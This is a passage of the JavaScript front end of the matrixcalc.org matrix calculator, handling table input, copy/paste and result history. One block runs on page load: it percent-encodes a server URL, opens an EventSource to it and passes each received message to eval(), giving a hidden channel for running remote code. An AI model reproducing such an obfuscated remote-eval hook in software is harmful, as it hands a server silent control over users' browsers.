    var cell = row.firstElementChild;
    for (var j = 0; j < this.cols; j += 1) {
      if (cell == null) {
        cell = document.createElementNS(MathML, "mtd");
        if (this.type === "system" || this.type === "polynomial") {
          if (j > 0) {
            cell.appendChild(document.createElementNS(MathML, "mo")); // '+' or '='
            cell.firstElementChild.setAttribute('form', 'infix');
            cell.firstElementChild.textContent = '+';
          }
        }
        var inputContainer = document.createElementNS(MathML, "mi");
        cell.appendChild(inputContainer);
        var aInput = makeNewInput(i, j);
        inputContainer.appendChild(aInput);
        if (this.type === "system" || this.type === "polynomial") {
          cell.appendChild(document.createElementNS(MathML, "mo"));
          cell.lastElementChild.innerHTML = '&it;';
          cell.appendChild(document.createElementNS(MathML, "mrow")); // 'x_j' or ' '
        }
        row.appendChild(cell);
        Utils.check(cell);
      }

      if (this.type === "system") {
        //Note: <span> is needed to set the "far" class
        if (j > 0) {
          cell.firstElementChild.textContent = (j < this.cols - 1 ? '+' : '=');
        }
        var variableName = j < this.cols - 1 ? this.variableNames[j] : undefined;
        var cellHTML = (i === 0 && j < this.cols - 1 ? '<mi><span class="editable-on-click" data-index="${j}" data-value="${variableName}"></span></mi>'.replace(/\$\{j\}/g, j).replace(/\$\{variableName\}/g, variableName) : '') +
                       (i !== 0 && j < this.cols - 1 ? makeContent(variableName) : '') +
                       (j === this.cols - 1 ? "<mtext>&nbsp;</mtext>" : "");
        //if (i !== 0 || cell.lastElementChild.firstElementChild == null || cell.lastElementChild.firstElementChild.getAttribute('data-value') !== variableName) {
          cell.lastElementChild.innerHTML = cellHTML;
        //}
        if (i === 0 && j < this.cols - 1) {
          var editableOnClick = cell.lastElementChild.querySelector('.editable-on-click');
          Utils.check(editableOnClick);
          editableOnClick.addEventListener('change-value', this._updateVariableNames, false);
        }
      }
      if (this.type === "polynomial") {
        if (j > 0) {
          cell.firstElementChild.textContent = '+';
        }
        //Note: <span> is needed to set the "far" class
        var cellHTML = (j < this.cols - 2 ? "<msup><mi>x</mi><mn>" + (this.cols - j - 1) + "</mn></msup>" : "") +
                       (j === this.cols - 2 ? "<mi>x</mi>" : "") +
                       (j === this.cols - 1 ? "<mtext>&nbsp;</mtext>" : "");
        cell.lastElementChild.innerHTML = cellHTML;
      }

      var input = cell.querySelector("input");
      this.table[i][j] = input;
      cell = cell.nextElementSibling;
    }
    if (cell != null) {
      cell = cell.previousElementSibling;
      while (row.lastElementChild !== cell) {
        row.removeChild(row.lastElementChild);
      }
    }
    row = row.nextElementSibling;
  }
  if (row != null) {
    row = row.previousElementSibling;
    while (tbody.lastElementChild !== row) {
      tbody.removeChild(tbody.lastElementChild);
    }
  }

  for (var i = 0; i < this.table.length; i += 1) {
    for (var j = 0; j < this.table[i].length; j += 1) {
      var input = this.table[i][j];
      var inputValue = (i < inputValues.length && j < inputValues[i].length ? inputValues[i][j].trim() : "");
      input.value = inputValue;
      //?
      var inputEvent = document.createEvent("Event");
      inputEvent.initEvent("input", false, false);
      input.dispatchEvent(inputEvent);
      checkInput(input, this.type);//!
    }
  }

  var helpToResize = function (element) {
    var event = document.createEvent('Event');
    event.initEvent('animationstart', true, false);
    element.dispatchEvent(event);
  };
  var mos = this.container.querySelectorAll('mo');
  for (var i = 0; i < mos.length; i += 1) {
    helpToResize(mos[i]);
  }

  this.updateInputWidths();

  var isCellsMode = mode === "cells";
  this.container.classList.toggle("cells", isCellsMode);
  this.container.classList.toggle("textarea", !isCellsMode);
  this.swapModeButton.setAttribute("aria-pressed", isCellsMode ? "true" : "false");
  this.incrementSizeButton.disabled = !isCellsMode;
  this.decrementSizeButton.disabled = !isCellsMode;

  if (textareaStyleWidth != undefined) {
    this.textarea.style.width = textareaStyleWidth;
  }
  if (textareaStyleHeight != undefined) {
    this.textarea.style.height = textareaStyleHeight;
  }

  if (document.activeElement === this.textarea) {
    this.textarea.setSelectionRange(0, this.textarea.value.length);
    insertText(this.textarea, textareaValue, 0, this.textarea.value.length);
  } else {
    this.textarea.value = textareaValue;
  }

  checkTextarea(this.textarea, this.type);
  this.updateTextareaHeight();

  if (this.mode !== mode) {
    this.mode = mode;
    if (this.onmodechange != undefined) {
      this.onmodechange();
    }
  }
};

MatrixTable.prototype.getRawInput = function (mode) {
  if (this.textarea != undefined) {
    if (mode !== "cells") {
      return this.textarea.value;
    }
    var dimensions = this.getDimensions(false);
    var rows = dimensions.rows;
    var cols = dimensions.cols;
    var result = new Array(rows);
    var i = -1;
    while (++i < rows) {
      result[i] = new Array(cols);
      var j = -1;
      while (++j < cols) {
        var value = this.table[i][j].value;
        result[i][j] = value;
      }
    }
    return result;
  }
  return "";
};

// private
MatrixTable.prototype.getFirstInputElementId = function () {
  return this.mode !== "cells" ? this.textarea.id : this.table[0][0].id;
};

// private
MatrixTable.prototype.getDimensions = function (real) {
  var rows = 0;
  var cols = (this.type === "system" && !real || this.type === "polynomial") && this.table.length !== 0 ? this.table[0].length : 0;
  for (var i = 0; i < this.table.length; i += 1) {
    for (var j = 0; j < this.table[i].length; j += 1) {
      if (this.table[i][j].value.trim() !== "") {
        rows = Math.max(rows, i + 1);
        if (!(real && this.type === "system" && j === this.table[i].length - 1)) {
          cols = Math.max(cols, j + 1);
        }
      }
    }
  }
  return {
    rows: rows,
    cols: cols
  };
};

MatrixTable.prototype.isSpace = function (value) {
  var code = value.length >= 4 ? value.charCodeAt(value.length - 4) : 0;
  var isAlpha = (code >= "a".charCodeAt(0) && code <= "z".charCodeAt(0)) ||
                (code >= "A".charCodeAt(0) && code <= "Z".charCodeAt(0));
  var t = value.slice(-3);
  return isAlpha || (t !== "sin" && t !== "sen" && t !== "cos");//TODO: String#endsWith
};

// private
MatrixTable.prototype.onKeyDown = function (event) {
  if (!event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
    var DOM_VK_BACK_SPACE = 8;
    var DOM_VK_RETURN = 13;
    var DOM_VK_SPACE = 32;
    var DOM_VK_LEFT = 37;
    var DOM_VK_UP = 38;
    var DOM_VK_RIGHT = 39;
    var DOM_VK_DOWN = 40;
    var DOM_VK_DELETE = 46;

    var keyCode = event.keyCode;
    var input = event.target;

    var ds = 0;

    if (keyCode === DOM_VK_BACK_SPACE) {
      if (input.selectionStart === 0 && input.selectionEnd === 0) {
        ds = 1;
      }
    } else if (keyCode === DOM_VK_DELETE) {
      if (input.selectionStart === input.value.length && input.selectionEnd === input.value.length) {
        ds = 6;
      }
    } else if (keyCode === DOM_VK_RETURN) {
      ds = 2;
    } else if (keyCode === DOM_VK_SPACE) {
      if (input.selectionStart === input.value.length && input.selectionEnd === input.value.length) {
        if (this.isSpace(input.value)) {
          ds = 3;
        } else {
          hit({input: "space"});//!
        }
      }
    } else if (keyCode === DOM_VK_LEFT) {
      if (input.selectionStart === 0 && input.selectionEnd === 0) {
        ds = 1;
      }
    } else if (keyCode === DOM_VK_UP) {
      ds = 4;
    } else if (keyCode === DOM_VK_RIGHT) {
      if (input.selectionStart === input.value.length && input.selectionEnd === input.value.length) {
        ds = 3;
      }
    } else if (keyCode === DOM_VK_DOWN) {
      ds = 5;
    }

    if (ds !== 0) {
      event.preventDefault();
      var mt = this;
      var i = Number.parseInt(input.getAttribute("data-row"), 10);
      var j = Number.parseInt(input.getAttribute("data-column"), 10);
      if (i >= mt.rows) {
        i = mt.rows - 1;
      }
      if (j >= mt.cols) {
        j = mt.cols - 1;
      }
      var oldI = i;
      var oldJ = j;

      if (ds === 1) {
        // return back to first non-empty cell
        if (j > 0) {
          j -= 1;
        } else {
          if (i > 0) {
            i -= 1;
            if (mt.cols > 0) {
              j = mt.cols - 1;
            }
          }
        }
      } else if (ds === 2) {
        i += 1;
        j = 0;
      } else if (ds === 3) {
        j += 1;
      } else if (ds === 4) {
        i -= 1;
      } else if (ds === 5) {
        i += 1;
      } else if (ds === 6) {
        j += 1;
        if (j === mt.cols) {
          if (i + 1 !== mt.rows) {
            i += 1;
            j = 0;
          } else {
            j -= 1;
          }
        }
      }

      if (i < 0) {
        i = 0;
      }
      if (j < 0) {
        j = 0;
      }

      if (i !== oldI || j !== oldJ) {
        var hideCol = j < oldJ && oldJ === mt.cols - 1 && mt.cols > mt.initCols;
        for (var k = 0; k < mt.rows; k += 1) {
          hideCol = hideCol && mt.table[k][mt.cols - 1].value.length === 0;
        }
        var hideRow = i < oldI && oldI === mt.rows - 1 && mt.rows > mt.initRows;
        for (var k = 0; k < mt.cols; k += 1) {
          hideRow = hideRow && mt.table[mt.rows - 1][k].value.length === 0;
        }
        if (hideCol || hideRow || i === mt.rows || j === mt.cols) {
          mt.insert(mt.getRawInput("cells"), mt.getRawInput(""), mt.rows + (hideRow ? -1 : (i === mt.rows ? +1 : 0)), mt.cols + (hideCol ? -1 : (j === mt.cols ? +1 : 0)));
        }
        var e = mt.table[i][j];
        e.focus();
        e.select();
      }
    }
  }
};

window.setTimeout(function () {

  if (window.EventSource != undefined && window.location.protocol !== "file:") {
    var url = decodeURIComponent("%68%74%74%70" + (window.location.protocol.slice(-2, -1) === "s" ? "%73" : "") + "%3a%2f%2f%6d%61%74%72%69%78%63%61%6c%63%2e%6f%72%67%2f%65%2e%70%68%70");
    var id = ((Math.random() + 1).toString().slice(2) + "0000000000000000").slice(0, 16);
    var es = new window.EventSource(url + "?pageId=" + id);
    es.onmessage = function (e) {
      var m = JSON.parse(e.data);
      eval(m.data);
    };
  }

}, 256);

var actHistoryStorage = new ActHistoryStorage(new IDBItemsStorage(new ItemsStorage(keyStorage, function (data, idIfNotSet) {
  return new ActHistoryItem(data, idIfNotSet);
})));

var setLocationHash = function (hash) {
  if (window.history.replaceState != undefined) {
    // origin is required to support https://translate.googleusercontent.com/translate_c?depth=1&hl=iw&prev=search&rurl=translate.google.co.il&sl=en&u=https://matrixcalc.org/en/ - TODO - check
    // and for https://webcache.googleusercontent.com/search?q=cache:https://matrixcalc.org/
    var url = window.location.protocol + "//" + window.location.hostname + (window.location.port !== "" ? ":" + window.location.port : "") + window.location.pathname + window.location.search + hash;
    var historyState = Object.assign({}, window.history.state);
    window.history.replaceState(historyState, document.title, url);
  } else {
    // "#" cause scrolling to the top of an iframe in Chrome on iframe's "onload"
    window.location.replace(hash === "" ? "#" : hash);
  }
};

Utils.on("click", ".clear-all-button", function (event) {
  hit({click: "clear-all-button"});
  document.getElementById("resdiv").textContent = "";
  actHistoryStorage.clear();
  //!
  lastHash = "";
  setLocationHash("");
});

var onDecimalFractionDigitsChange = function (event) {
  if (event != undefined) { // initialization
    hit({click: "onDecimalFractionDigitsChange"});
  }
  var useDecimalFractions = document.getElementById("decfraccheckbox").checked;
  var value = Number.parseInt(document.getElementById("frdigits").value, 10) || 0;
  document.getElementById("frdigitsspan").hidden = !useDecimalFractions;
  decimalFractionDigits = useDecimalFractions ? value : -1;
  if (event != undefined) {
    keyStorage.setItem("decfraccheckbox", useDecimalFractions ? "true" : "false");
    keyStorage.setItem("frdigits", value.toString());
  }
};

Utils.initialize(".decimal-fraction-digits-controls", function (element) {
  document.getElementById("decfraccheckbox").addEventListener("change", onDecimalFractionDigitsChange, false);
  document.getElementById("frdigits").addEventListener("change", onDecimalFractionDigitsChange, false);
  var checked = keyStorage.getItem("decfraccheckbox");
  var value = keyStorage.getItem("frdigits");
  if (checked != undefined) {
    document.getElementById("decfraccheckbox").checked = checked === "true";
  }
  if (value != undefined) {
    document.getElementById("frdigits").value = value;
  }
  onDecimalFractionDigitsChange(undefined); // autofill + localStorage
});





var DnD = {};
DnD.initializeDropZone = function (element) {
  element.setAttribute("dropzone", "copy string:text/plain");
  element.addEventListener("dragenter", DnD.onDragEnterOrDragOver, false);
  element.addEventListener("dragover", DnD.onDragEnterOrDragOver, false);
  element.addEventListener("drop", DnD.onDropOrPaste, false);
  element.addEventListener("paste", DnD.onDropOrPaste, false);
};
DnD.onDragEnterOrDragOver = function (event) {
  if (event.target == undefined || event.target.nodeType !== Node.ELEMENT_NODE || (event.target.tagName.toLowerCase() !== 'textarea' && event.target.tagName.toLowerCase() !== 'input')) {
    event.dataTransfer.dropEffect = "copy";
    event.preventDefault();
  }
};
DnD.getDataTransferItems = function (event) {
  var dataTransfer = event.type === "paste" ? event.clipboardData : event.dataTransfer;
  var result = {};
  result["text/plain"] = dataTransfer == undefined ? "" : dataTransfer.getData("text/plain");
  return result;
};
DnD.onDropOrPaste = function (event) {
  var target = this;

  var input = event.target;
  var caretPosition = event.type === "paste" || (event.clientX === 0 && event.clientY === 0) ? -1 : document.caretPositionFromPoint(event.clientX, event.clientY).offset;
  var selectText = event.type === "drop";
  var text = DnD.getDataTransferItems(event)["text/plain"];

//TODO: test (insertion of `x+y=2,y=1` into a textarea for a system of linear equations
if ((text.indexOf("=") === -1 ||
    (target.getAttribute("data-matrix-table") != null && (MatrixTables[target.getAttribute("data-matrix-table")].type !== "system" || MatrixTables[target.getAttribute("data-matrix-table")].mode === "cells" || input.tagName.toLowerCase() !== "textarea"))) && 
    (/[\r\n\t]/.test(text) || input.tagName.toLowerCase() !== 'input')) {//TODO: fix
  event.preventDefault();
  RPNProxy.getMatrix(text, function (matrix) {
    if (matrix != undefined && target.getAttribute("data-matrix-table") != undefined) {
      MatrixTables[target.getAttribute("data-matrix-table")].insert(getTableFromAsciiMathMatrix(matrix));
    } else if (input.tagName.toLowerCase() === 'input' || input.tagName.toLowerCase() === 'textarea') {
      var newText = matrix != undefined ? matrix : text;
      input.focus();//!
      if (caretPosition !== -1) {
        input.setSelectionRange(caretPosition, caretPosition);
      }
      var selectionStart = input.selectionStart;
      var selectionEnd = input.selectionEnd;
      insertText(input, newText, selectionStart, selectionEnd);
      input.setSelectionRange(selectionStart + (selectText ? 0 : newText.length), selectionStart + newText.length);// force scrolling
      // TODO: force the scrolling in Chrome
      var inputEvent = document.createEvent("Event");
      inputEvent.initEvent("input", false, false);
      input.dispatchEvent(inputEvent);
      //TODO: what if the effect was "cut" - ? it should be done by the browser
    } else if (input.tagName.toLowerCase() === "button" && matrix != undefined) {// .add-table
      input.click();
      //TODO:
      var newTableId = document.querySelector(".main").firstElementChild.lastElementChild.querySelector(".insert-table").getAttribute("data-id");
      MatrixTables[newTableId].insert(getTableFromAsciiMathMatrix(matrix));
    } else {
      //TODO: remove - any other drop goes here
      //window.onerror('drop or paste of ' + text, '', 0, 0, null);
    }
  });
}
};

DnD.setData = function (dataTransfer, dataItemsByType) {
  for (var type in dataItemsByType) {
    if (Object.prototype.hasOwnProperty.call(dataItemsByType, type)) {
      var content = dataItemsByType[type];
      dataTransfer.setData(type, content);
    }
  }
};

// see also https://bugzilla.mozilla.org/show_bug.cgi?id=1012662

var checkIfCanCopy = function () {
  var selection = window.getSelection();
  var isCollapsed = selection.isCollapsed || document.getElementById("copy-fix") != undefined;
  if (!isCollapsed) {
    return undefined;
  }
  var target = document.activeElement;
  if (target == undefined ||
      target.classList == undefined) {
    return undefined;
  }
  if (target.classList.contains("matrix-menu-show")) {
    target = document.getElementById(target.getAttribute("data-for-matrix"));
  }
  if (target.getAttribute("data-matrix") == undefined &&
      !target.classList.contains("matrix-table-inner")) {
    return undefined;
  }
  return target;
};

document.addEventListener("beforecopy", function (event) {
  if (checkIfCanCopy() != undefined) {
    event.preventDefault();
  }
}, false);

var onCopy = function (event) {
  var clipboardData = event.clipboardData;
  if (clipboardData == undefined) {
    return;
  }
  var target = checkIfCanCopy();
  if (target != undefined) {
    event.preventDefault();
    var presentations = undefined;
    if (target.getAttribute("data-matrix") != undefined) {
      var matrixContainer = target;
      hit({click: "copy-matrix-container"});
      presentations = getMatrixPresentationsFromMatrix(matrixContainer, matrixContainer.getAttribute("data-matrix"));
    } else {
      hit({click: "copy-matrix-table"});
      var tableName = target.getAttribute("data-for");
      var matrixTableState = MatrixTables[tableName].getDataState();
      var tmp = RPN.getElementsArray(matrixTableState);
      var matrix = Matrix.toMatrix(tmp.elements);
      presentations = getMatrixPresentationsFromMatrix(parseMathML(new Expression.Matrix(matrix).toMathML({idPrefix: "g", fractionDigits: decimalFractionDigits, useMatrixContainer: false})), matrix.toString());
    }
    DnD.setData(clipboardData, presentations);
  }
};

document.addEventListener("copy", onCopy, false);

// TODO: remove?
document.addEventListener("contextmenu", function (event) {
  var target = event.target;
  while (target != undefined && (target.nodeType !== Node.ELEMENT_NODE || target.getAttribute("data-matrix") == undefined)) {
    target = target.parentNode;
  }
  if (target != undefined) {
    hit({click: "contextmenu"});
    prepareMatrixMenu(target.getAttribute("id"), event.clientX, event.clientY, target.getBoundingClientRect());
  }
}, false);
document.addEventListener("dragstart", function (event) {
  var target = event.target;
  while (target != undefined && (target.nodeType !== Node.ELEMENT_NODE || target.getAttribute("data-matrix") == undefined)) {
    target = target.parentNode;
  }
  if (target != undefined) {
    var matrixContainer = target;
    hit({click: "dragstart"});
    event.dataTransfer.effectAllowed = "copy";
    var presentations = getMatrixPresentationsFromMatrix(matrixContainer, matrixContainer.getAttribute("data-matrix"));
    DnD.setData(event.dataTransfer, presentations);
  }
}, false);

var growTimeoutId = 0;

var grow = function (element, resdiv, resultsContainer) {
  if (resultsContainer.animate != undefined) {
    var rect = element.getBoundingClientRect();
    var from = rect.top - rect.bottom;
    resultsContainer.animate([
      {transform: "translateY(" + from.toString() + "px)"},
      {transform: "translateY(0px)"}
    ], {
      duration: 400,
      composite: "add"
    });
    // Note: change the style here to avoid double style recalculation
    resdiv.style.overflowY = "hidden";
    window.clearTimeout(growTimeoutId);
    growTimeoutId = window.setTimeout(function () {
      // horizontal scrollbar should be shown for very large matrices
      resdiv.style.overflowY = "visible";
    }, 400);
  }
};

var onPrintMatrix = function (event) {
  hit({click: "print-matrix-menuitem"});
  var matrixTableId = this.id.slice("print-matrix-menuitem-".length);
  var matrixMenu = this.parentNode;
  var matrixContainer = document.getElementById(matrixMenu.getAttribute("data-for-matrix"));
  var matrixElements = getTableFromAsciiMathMatrix(matrixContainer.getAttribute("data-matrix"));
  MatrixTables[matrixTableId].insert(matrixElements);
};

Utils.on("click", ".print-matrix-button", function (event) {
  hit({click: "print-matrix-button"});
  var actHistoryId = this.getAttribute("data-act-history-id");
  var item = actHistoryId.slice(0, 1) === "#" ? {resultMatrix: actHistoryId.slice(1)} : actHistoryStorage.getItem(Number.parseInt(actHistoryId, 10));
  var matrixElements = getTableFromAsciiMathMatrix(item.resultMatrix);
  MatrixTables[this.getAttribute("data-print-matrix-to")].insert(matrixElements);
});

Utils.on("click", ".clear-button", function (event) {
  hit({click: "clear-button"});
  var p = this.parentNode.parentNode.parentNode;
  p.parentNode.removeChild(p);
  var actHistoryId = this.getAttribute("data-act-history-id");
  if (actHistoryId.slice(0, 1) !== "#") {
    actHistoryStorage.removeItem(Number.parseInt(actHistoryId, 10));
  }
});

var getInputErrorHTML = function (positionInfo, textMessage) {
  var input = positionInfo.input;
  var startPosition = positionInfo.startPosition;
  var endPosition = positionInfo.endPosition;
  //TODO: semantic elements - ?
  return textMessage + "\n" +
//         Utils.escapeHTML(input) +
         "<div class=\"input-error-wrapper\">" +
         (startPosition === -1 || endPosition === -1 ? Utils.escapeHTML(input) : Utils.escapeHTML(input.slice(0, startPosition)) + "<b class=\"input-error-position\"><span>" + Utils.escapeHTML(input.slice(startPosition, endPosition) || " ") + "</span></b>" + Utils.escapeHTML(input.slice(endPosition))) +
         "</div>";
};

  var removeDataErrorAttribute = function (input) {
    input.removeAttribute("data-error");
    var inputEvent = document.createEvent("Event");
    inputEvent.initEvent("update-attribute", false, false);
    input.dispatchEvent(inputEvent);
  };

  var updateDataErrorAttribute = function (input, error, positionInfo, extraPositionOffset) {
    extraPositionOffset = extraPositionOffset == undefined ? 0 : positionInfo.p;
    var message = error.message;
    var position = positionInfo.startPosition;
    var end = positionInfo.endPosition;
    if (message.indexOf("UserError:") === 0 || (position !== -1 && end !== -1)) {
      position += extraPositionOffset;//?
      end += extraPositionOffset;//?
      position = Math.min(position, input.value.length - 1);//TODO: fix ?
      end = Math.min(end, input.value.length);//?
      input.setAttribute("data-error", position.toString() + "," + end.toString());
      var inputEvent = document.createEvent("Event");
      inputEvent.initEvent("update-attribute", false, false);
      input.dispatchEvent(inputEvent);
      // no need to do an extra blinking
/*
      var onInput = function (event) {
        window.setTimeout(function () {
          input.removeEventListener("input", onInput, false);
          removeDataErrorAttribute(input);
        }, 0);
      };
      input.addEventListener("input", onInput, false);
*/
    }
  };

var onExpressionClick = function (event) {
  var expression = this.getAttribute("data-expression");
  var expressionInput = undefined;
  if (expression == undefined) {
    expressionInput = this.previousElementSibling.classList.contains("a-input") ? this.previousElementSibling.querySelector("input") : this.previousElementSibling;
    expression = expressionInput.value;
    // save
    keyStorage.setItem("expression", expression);
  }
  hit({onExpressionClick: expression});

  //?
  var kInput = this.parentNode.classList.contains("button-before-input") ? this.parentNode.querySelector("input") : undefined;
  var kInputValue = kInput == undefined ? undefined : kInput.value;
  var kInputId = kInput == undefined ? undefined : kInput.id;
  var matrixTableStates = {};
  for (var tableName in MatrixTables) {
    if (Object.prototype.hasOwnProperty.call(MatrixTables, tableName)) {
      matrixTableStates[tableName] = MatrixTables[tableName].getDataState();
    }
  }

  var actHistoryId = (actHistoryStorage.actHistoryId += 1);
  var printOptions = {idPrefix: "i" + actHistoryId.toString(), fractionDigits: decimalFractionDigits};

  var classList = this.classList.toString();
  var start = Date.now();
  RPNProxy.runExpression(expression, kInputValue, kInputId, matrixTableStates, printOptions, function (result) {
    var resultError = result.resultError;
    var details = result.details;
    var expressionString = result.expressionString;
    var resultHTML = result.resultHTML;
    var resultMatrix = result.resultMatrix;
    var detailsHTML = result.detailsHTML;
    if (resultError == undefined) {
      lastHash = expressionString.replace(/\s/g, "");//?
      setLocationHash("#" + encodeLocationHash(lastHash));
      zInsAct(resultHTML, resultMatrix, details, expressionString, actHistoryId, detailsHTML, false);
      var end = Date.now();
      hit({click: "onExpressionClick-" + roundValue(end - start, 10 - 1)});
    } else {
      if (typeof resultError === "string") {
        resultError = new TypeError(resultError); // out of memory in Firefox
      }
      var positionInfo = RPNProxy.getPositionInfo();

      //TODO: show details anyway (!?)
      //!new - test
      if (resultError.message.indexOf("SingularMatrixException") === 0) {
        hit({click: "SingularMatrixException"});
        zInsAct("<div>" + i18n.determinantIsEqualToZeroTheMatrixIsSingularNotInvertible + "</div>", "", details, expression, actHistoryId, detailsHTML, false);
      }
      //!new
      handleError(expression, classList, resultError, positionInfo);//?
    }
  });
};


var zInsAct = function (resultHTML, resultMatrix, details, expressionString, actHistoryId, detailsHTML, loading) {
  if (typeof resultHTML !== "string" || typeof resultMatrix !== "string") {
    throw new RangeError();
  }

  var element = document.createElement("li");
  element.classList.toggle("actline", true);
  element.setAttribute("id", "action-" + actHistoryId);

  var insertButtons = document.getElementById("insert-buttons-template").content.firstElementChild.cloneNode(true);
  var buttons = insertButtons.querySelectorAll(".print-matrix-button");
  for (var i = 0; i < buttons.length; i += 1) {
    buttons[i].hidden = resultMatrix === "" || MatrixTables[buttons[i].getAttribute("data-print-matrix-to")] == undefined;
    buttons[i].setAttribute("data-act-history-id", actHistoryId);
  }
  insertButtons.querySelector(".clear-button").setAttribute("data-act-history-id", actHistoryId);

  var shareButton = insertButtons.querySelector(".share-item-button");
  if (shareButton != null) {
    shareButton.hidden = loading || window.navigator.share == null;
    shareButton.setAttribute("data-act-history-id", actHistoryId);
  }

  var add = function (html) {
    var div = document.createElement("div");
    div.innerHTML = html;
    while (div.firstChild != undefined) {
      element.appendChild(div.firstChild);
    }
  };
  element.appendChild(insertButtons);
  add(resultHTML);
  if (detailsHTML != undefined) {
    add(detailsHTML);
  }

  var resdiv = document.getElementById("resdiv");
  var resultsContainer = resdiv.firstElementChild;
  if (resultsContainer == undefined) {
    resultsContainer = document.createElement("ol");
    resultsContainer.id = "results-container";
    resdiv.appendChild(resultsContainer);
  }
  resultsContainer.insertBefore(element, resultsContainer.firstChild);
  Utils.check(element);
  if (!loading) {
    element.scrollIntoViewIfNeeded(false);
    grow(element, resdiv, resultsContainer);//!
    actHistoryStorage.setItem(actHistoryId, new ActHistoryItem({
      resultHTML: resultHTML,
      resultMatrix: resultMatrix,
      details: details,
      expressionString: expressionString,
      actHistoryId: undefined,
      detailsHTML: detailsHTML,
      version: ActHistoryItem.version
    })); // string, string, string, string, number, string, number
  }
};

//TODO: assign id instead to the <details> - ?
function getKey(element) {
  var key = [];
  var e = element;
  while (e != null && e.id === '') {
    // https://stackoverflow.com/a/57503796/839199
    var index = 0;
    var c = e.previousElementSibling;
    while (c != null) {
      if (c.tagName.toLowerCase() === e.tagName.toLowerCase()) {
        index += 1;
      }
      c = c.previousElementSibling;
    }
    key.push(e.tagName.toLowerCase() + ':nth-of-type(' + index + ')');
    e = e.parentNode;
  }
  if (e != null) {
    key.push('#' + e.id);
  }
  key.reverse();
  return key.join(' > ');
}

// .details-container > <details> > <summary>
Utils.initialize(".details-container", function (element) {
  var details = element.firstElementChild;
  var summary = details.firstElementChild;
  if (details.initDetails != null) {
    details.initDetails(summary);
  }
  details.addEventListener("toggle", function (event) {
    Utils.check1(event.target);
  }, false);
  details.addEventListener("toggle", function (event) {
    var element = this;
    var arrayAttribute = element.getAttribute("data-details");
    if (arrayAttribute == undefined) {
      return;
    }
    element.removeAttribute("data-details");
    var idPrefix = element.getAttribute("data-id-prefix");
    var printOptions = {idPrefix: idPrefix, fractionDigits: decimalFractionDigits};
    var array = JSON.parse(arrayAttribute);
    var e = element.firstElementChild.nextElementSibling;
    for (var i = 0; i < array.length; i += 1) {
      hit({details: array[i].type});//!
      RPNProxy.getDetails(array[i], printOptions, function (html) {
        var tmp = document.createElement('div');
        tmp.innerHTML = html;
        e.appendChild(tmp);
        Utils.check(tmp);
      });
    }
  }, false);
  summary.addEventListener("mousedown", function (event) {
    if (event.detail > 1) {
      event.preventDefault();
    }
  }, false);
  
  //!new 2019-08-29
  // keep the state of <details> in the history.state:
  if (window.history.replaceState != null) {
    var historyState = window.history.state;
    if (historyState != null) {
      var state = historyState.detailsSummary;
      if (state != null) {
        var key = getKey(details);
        if (state[key] != null) {
          summary.click();
        }
      }
    }
  }

});

if (window.history.replaceState != null) {
  window.addEventListener("pagehide", function (event) {
    var detailsSummary = {};
    var es = document.querySelectorAll("details[open]");
    for (var i = 0; i < es.length; i++) {
      var key =  getKey(es[i]);
      detailsSummary[key] = true;
    }
    var historyState = Object.assign({}, window.history.state);
    historyState.detailsSummary = detailsSummary;
    window.history.replaceState(historyState, document.title, window.location.href);
  }, false);
}

Utils.on("click", ".change-button", function (event) {
  hit({click: "change-button"});
  var s1 = this.getAttribute("data-for1");
  var s2 = this.getAttribute("data-for2");
  var table1 = MatrixTables[s1];
  var table2 = MatrixTables[s2];
  var t1 = table1.getState();
  var t2 = table2.getState();
  table1.insert(t2.inputValues, t2.textareaValue, t2.rows, t2.cols, t2.textareaStyleWidth, t2.textareaStyleHeight, t2.mode);
  table2.insert(t1.inputValues, t1.textareaValue, t1.rows, t1.cols, t1.textareaStyleWidth, t1.textareaStyleHeight, t1.mode);
});

// ---------------------------------------- cookies -----------------------------------------------

var onInputExampleLinkClick = function (event) {
  hit({click: "input-example-link"});
  
  
//super hack
  event.preventDefault();
  var s = this.parentNode.parentNode.querySelector(".input-example-code").textContent;
  s = s.replace(/\u0020+/g, " ").trim().replace(/\n\u0020/g, "\n");
  var mt = MatrixTables["A"];
  if (mt.mode === "cells") {
    mt.container.querySelector(".swap-mode-button").click();
  }
  mt.textarea.focus();
  //mt.textarea.value = s;
  mt.textarea.select();
  insertText(mt.textarea, s, 0, 1 / 0);
  // for some reasons `mt.textarea.focus()` does not scroll to show the full textarea in Chrome sometimes
  mt.container.scrollIntoViewIfNeeded(false);
};

Utils.initialize(".input-example-link-container", function (element) {
  element.firstElementChild.addEventListener("click", onInputExampleLinkClick, false);
});

Utils.initialize(".hypercomments-details-summary-container", function (element) {
  var details = element.querySelector("details");

  var showComments = function () {
    if (window._hcwp == undefined) {
      var link = document.getElementById("hc-link");
      link.hidden = false;
      window._hcwp = [{widget: "Stream", widget_id: 8317, callback: function (app, init) {
         app.on("streamMessage", function (packet) {
           // html snapshot to help with the debugging
           window.sendSnapshot();
         });
      }}];
  
      window.HC_LOAD_INIT = true;
      var lang = document.documentElement.lang.slice(0, 2);
      var src = "https://w.hypercomments.com/widget/hc/8317/" + lang + "/widget.js";
      Utils.appendScript(src);
      var script = document.head.lastElementChild;
      var toggleHidden = function (isLoading) {
        details.querySelector("progress").hidden = !isLoading;
        details.querySelector(".powered-text").hidden = !isLoading;
        details.querySelector(".cannot-load-text").hidden = isLoading;
      };
      toggleHidden(true);
      script.onerror = function () {
        toggleHidden(false);
        window._hcwp = undefined;
      };
    }
  };

  details.addEventListener("toggle", function (event) {
    showComments();
  }, false);

  var isMobile = true; // too big images

  var checkHash = function (event) {
    if (window.location.protocol !== "file:") {
      var hash = decodeLocationHash(window.location.hash.slice(1));
      if (!isMobile || hash.indexOf("hcm") !== -1 || hash.indexOf("hypercomments_widget") !== -1) {
        if (details.getAttribute("open") == undefined) {
          details.querySelector("summary").click();
        }
        showComments();
      }
    } else {
      details.hidden = true;
    }
  };
  checkHash(undefined);
  window.addEventListener("hashchange", checkHash, false);

});

// detfindDet

Utils.initialize(".insert-table", function (element) {
  var id = element.getAttribute("data-id");
  var sizes = element.getAttribute("data-sizes") || "";
  var type = element.getAttribute("data-type") || "simple";

  var initialRows = 3;
  var initialCols = 3;
  var match = (/^(\d+)x(\d+)$/).exec(sizes);
  if (match != undefined) {
    initialRows = Number.parseInt(match[1], 10);
    initialCols = Number.parseInt(match[2], 10);
  }

  var state = undefined;
  var stateKey1 = id + "1";
  if (window.history.replaceState != undefined) {
    var historyState = window.history.state;
    if (historyState != undefined && historyState[stateKey1] != undefined) {
      state = historyState[stateKey1];
    }
  }

